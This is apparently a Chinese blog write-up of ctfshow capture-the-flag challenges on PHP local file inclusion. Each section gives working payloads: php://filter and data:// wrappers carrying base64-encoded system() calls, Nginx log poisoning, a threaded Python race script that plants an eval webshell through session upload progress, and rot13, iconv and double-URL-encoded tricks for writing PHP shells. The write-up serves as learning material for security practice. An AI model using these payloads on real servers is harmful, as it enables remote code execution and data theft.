---
title: ctfshow文件包含
date: 2024-09-09 14:32:44
tags: 
     - 文件包含
     - ctfshow
categories: 学习笔记
---

## web-78

![image-20240524210517488](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405242105624.png)

有个include，我们使用filter协议

<!--more-->

```
?file=php://filter/convert.base64-encode/resource=flag.php
```

得到flag.php的base64编码，进行解码得到flag

![image-20240524210616281](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405242106454.png)



## web-79

这题过滤了php，所以我们就不能用php伪协议了，我们用data伪协议

payload

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==  
//<?php system("cat%20flag.php"); ?>
```

在查看页面源码就得到flag了

![image-20240524215512496](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405242155566.png)



## web-80-81(日志包含)

这题php和data都被过滤了，我们采用日志包含进行绕过

```
?file=/var/log/nginx/access.log&1=system('tac f*');
```

![image-20240526143441902](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405261434992.png)

得到flag

![image-20240526143459596](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405261434634.png)

------

## web-82-86(session.upload_progress)

这道题把.给过滤了，我们采用session.upload_progress来做

linux下，默认保存session的文件路径/tmp或/var/lib/php/session；Windows下session文件的路径不固定。
关于session，只要你与一个网站建立连接，网站某个文件夹下就会产生session文件，关闭浏览器或者过了一段时间，session就会失效，再次建立连接的话就会产生新的session文件。



​		我们使用脚本

```
import requests
import threading
import sys
session=requests.session()
sess='yu22x'
url1="https://88b1b883-b820-4d9d-b01d-affc6a953ea1.challenge.ctf.show/"
url2='https://88b1b883-b820-4d9d-b01d-affc6a953ea1.challenge.ctf.show/?file=/tmp/sess_'+sess
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
}
data2={
	'1':'system("cat f*");'
}
file={
	'file':'abc'
}
cookies={
	'PHPSESSID': sess
}
def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.post(url2,data=data2)
		if 'ctfshow{' in r.text:
			print(r.text)
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()
```

运行，得到flag

![image-20240526185010314](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405261850422.png)



或者使用条件竞争(没做出来)https://www.cnblogs.com/NPFS/p/13795170.html



## web-87

这道题过滤了php和data还有：和.，同时将传入的file进行了unicode解码

我们知道**当服务器端接收到经过URL编码的数据后(数据包里的被URL编码的数据也会被URL解码)，会自动进行解码，故此处file参数的值需要二次URL编码。**

简单来说，第一次服务器默认解码一次，第二次在代码端urldecode解码一次



**关于URL编码与解码**。[URL编码解码详解，看这一篇就够够的了](https://cloud.tencent.com/developer/article/2308496)

当 URL 路径或者查询参数中，带有中文或者特殊字符的时候，就需要对 URL 进行编码。URL 编码协议规定（RFC3986 协议）：URL 中只允许使用 ASCII 字符集可以显示的字符，比如英文字母、数字、和- _ . ~ ! *这 6 个特殊字符。哪些字符需要编码，分为以下三种情况：

- ASCII 表中没有对应的可显示字符，例如，汉字。
- 不安全字符，包括：`#、”、%、 <、>、[、]、{、}、|、\、^ `。
- 部分保留字符，即 `&、/、:、;、=、?、@`。

  URL中出现特殊字符，火狐浏览器会先对齐URL编码再发送，使得请求数据包中的请求的参数是经过编码后的数据。



接下来来看写入文件内容

```
<?php die('大佬别秀了');?>
这个也写进文件中，这样子的话php文件执行了这个就会停止，不会执行我们的代码，所以需要一个过滤器，只读我们的代码。 
即php://filter/read=string.rot13/resource=a.php然后content写入rot13加密的<?php system('tac f*');?>
就是<?cuc flfgrz('gnp s*');?>

```



*string.rot13过滤器 一种字符处理方式，将字符右移13位*

payload

```
GET
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30

POST
content=<?cuc flfgrz('gnp s*');?>
```

最后访问a.php，得到flag

![image-20240618200058159](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406182000213.png)

这题也能用base64做

```
php://filter/convert.base64-encode/resource=a.php
```

```
content=11PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==
其中PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==是"<?php system('tac f*');?>"的base64编码。前面的11是为了填充"<?php die('大佬别秀了');?>"
base64 4位4位解码，其中"<?php die('大佬别秀了');?>"解码的内容其实只有phpdie，所以需要再填充两位。
```



## web-88

![image-20240618202034160](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406182020200.png)

这题过滤了php和一些字符，我们使用data伪协议来做

由于过滤了+和=，我们在编码是要注意用字符来补位

```
<?php eval($_GET[1]);?>a
```

多加个a是用来去掉base64编码后的=

最终payload：

```
?file=data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7ID8+&1=system('tac f*');
```



## web-116

下载视频后去hxd或者010打开，发现里面有张图片，里面有源码。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201020173740724.png)

看到源码，没有过滤flag.php，直接file=flag.php

抓包发现flag

![image-20240618202847781](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406182028834.png)

## web-117

这题唯独没有过滤`php://filter`，这里需要使用`convert.iconv.*`过滤器

```
# url
http://92caed34-03fd-4991-90dc-6e8354ba37a8.challenge.ctf.show/?file=php://filter/write=convert.iconv.UCS-2BE.UCS-2LE/resource=1.php
# POST
contents=?<hp pe@av(l_$OPTS'[mc'd)]?;>> //字符UCS-2LE->UCS-2BE的编码，字符多加一个>是防止报错，php中标签外的>不解析。

```

`convert.iconv.*`其实就是一个字符转换，`convert.iconv.<input-encoding>.<output-encoding>`。可以在linux下使用`iconv`进行字符编码转换，语法如下：

```
iconv -f UCS-2LE -t UCS-2BE [源文件名] > [输出文件名]
```

得到flag

![image-20240618203722807](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406182037877.png)
